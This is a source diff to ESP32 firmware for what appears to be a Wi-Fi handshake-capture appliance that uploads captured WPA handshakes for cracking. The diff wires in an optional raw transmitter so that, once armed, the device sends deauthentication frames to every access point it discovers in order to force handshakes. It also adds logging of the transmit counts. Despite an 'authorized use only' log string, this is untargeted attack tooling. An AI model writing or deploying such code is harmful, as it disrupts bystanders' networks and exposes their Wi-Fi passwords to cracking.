@@ -12,6 +12,7 @@
 #include <new>
 
 #include "config/active_board.h"
+#include "core/deadline.h"  // reached(): wrap-safe deadline test, shared with the deauth heartbeat.
 #include "core/event_bus.h"
 #include "net/ap_registry.h"
 #include "net/capture_queue.h"
@@ -22,6 +23,7 @@
 #include "net/cracked_sync.h"
 #include "net/hunt_engine.h"
 #include "net/radio_sniffer_esp32.h"
+#include "net/raw_transmitter_esp32.h"
 #include "net/station_control_esp32.h"
 #include "net/sync_scheduler.h"
 #include "net/sync_session.h"
@@ -52,7 +54,12 @@ uint8_t g_hopChannels[3] = {1, 6, 11};
 Esp32RadioSniffer g_sniffer;
 ApRegistry g_registry;
 CaptureReadyRelay g_relay;
-HuntEngine g_engine(g_sniffer, g_registry, g_relay, g_hopChannels, 3, HuntConfig{});
+// The raw-TX seam (ADR-0029): ships in every binary but is injected into the engine only when the
+// operator armed deauth, so a disarmed device holds it inert. The engine is placement-new'd in
+// huntLoopBegin once the arm state is known from NVS, matching the file's other runtime singletons.
+Esp32RawTransmitter g_rawTx;
+alignas(HuntEngine) uint8_t g_engineStorage[sizeof(HuntEngine)];
+HuntEngine* g_engine = nullptr;
 LittleFsCaptureStore g_store;
 CaptureQueue g_queue(g_store);
 WpaSecUploader g_uploader;
@@ -165,6 +172,12 @@ Esp32StationControl* g_station = nullptr;
 UploadSupervisor* g_supervisor = nullptr;
 bool g_running = false;
 
+// Deauth arm state + heartbeat (ADR-0029): when armed, log the engine's deauth TX counts every 2s so
+// a surface and the on-air verify can see a shipped binary transmitting during its hunt.
+constexpr uint32_t kDeauthHeartbeatMs = 2000;
+bool g_deauthArmed = false;
+uint32_t g_deauthHbDueMs = 0;
+
 #ifdef SAPPER_TEST_HOOKS
 // A synthetic wpa-sec-valid handshake (beacon + M1 + M2) for the on-air verify's stimulus, built with
 // the same minimal frames the native tests use so serializeHandshake emits a well-formed pcap. It is
@@ -236,11 +249,17 @@ bool huntLoopBegin(const ProvisioningRecord& creds, const UploadSupervisorConfig
     }
 
     g_creds = creds;  // own the credentials so the adapter/supervisor pointers never dangle.
+    // Arm the engine iff the operator armed deauth in NVS (ADR-0029, default-off). Disarmed injects a
+    // null transmitter -> the pre-0029 passive hunt. Built before the supervisor, which holds it by ref.
+    g_deauthArmed = g_creds.deauthEnabled;
+    g_engine = new (g_engineStorage)
+        HuntEngine(g_sniffer, g_registry, g_relay, g_hopChannels, 3, HuntConfig{},
+                   g_deauthArmed ? &g_rawTx : nullptr);
     g_station = new (g_stationStorage) Esp32StationControl(g_creds.ssid, g_creds.pass);
     g_sync = new (g_syncStorage) CrackedSync(g_fetcher, g_manifest, g_creds.key, g_bus);
     g_session = new (g_sessionStorage) ScheduledSyncSession(g_scheduler, *g_sync);
     g_supervisor = new (g_supervisorStorage)
-        UploadSupervisor(g_engine, g_queue, g_uploader, *g_station, g_creds.key, config, g_session, &g_bus);
+        UploadSupervisor(*g_engine, g_queue, g_uploader, *g_station, g_creds.key, config, g_session, &g_bus);
     g_relay.setTarget(*g_supervisor);
 
     // Wire the push-notification surface iff a usable webhook URL is provisioned (ADR-0023). A bad or
@@ -274,10 +293,14 @@ bool huntLoopBegin(const ProvisioningRecord& creds, const UploadSupervisorConfig
         Serial.println("[SCREEN] disabled (no display)");
     }
 
-    if (!g_engine.begin(millis())) {
+    if (!g_engine->begin(millis())) {
         Serial.println("[FATAL] hunt engine could not begin (promiscuous mode failed)");
         return false;
     }
+    // Announce the arm state (ADR-0029): a shipped, armed appliance deauths every AP it discovers.
+    Serial.println(g_deauthArmed
+        ? "[DEAUTH] ARMED - deauthing discovered APs to force handshakes (authorized use only)"
+        : "[DEAUTH] disarmed - passive hunt (arm via the provisioning portal)");
     g_supervisor->begin(millis());  // also seeds the hourly sync cadence (SyncSession::begin).
     g_ledDriver.begin();            // configure the LED GPIO now the Arduino core is up.
     g_ledSurface.begin(millis());   // light the LED in its hunting heartbeat.
@@ -290,10 +313,18 @@ bool huntLoopBegin(const ProvisioningRecord& creds, const UploadSupervisorConfig
 void huntLoopPump() {
     if (!g_running) return;
     const uint32_t now = millis();
-    g_engine.tick(now);
+    g_engine->tick(now);
     g_supervisor->tick(now);   // publishes DrainStarted/DrainCompleted (and runs a due sync) onto the bus.
     g_ledSurface.tick(now);    // after the supervisor, so a status published this iteration shows now.
     if (g_screen != nullptr) g_screen->tick(now);  // likewise: render any status change this iteration.
+    // Deauth heartbeat (ADR-0029): only when armed, so a disarmed shipped binary stays silent on it.
+    if (g_deauthArmed && reached(now, g_deauthHbDueMs)) {
+        g_deauthHbDueMs = now + kDeauthHeartbeatMs;
+        Serial.printf("[DEAUTH] txOk=%lu txFail=%lu capturing=%d\n",
+                      static_cast<unsigned long>(g_engine->deauthTxOk()),
+                      static_cast<unsigned long>(g_engine->deauthTxFail()),
+                      g_engine->capturingBssid() != nullptr ? 1 : 0);
+    }
 }
 
 const DrainOutcome& huntLoopLastDrain() {
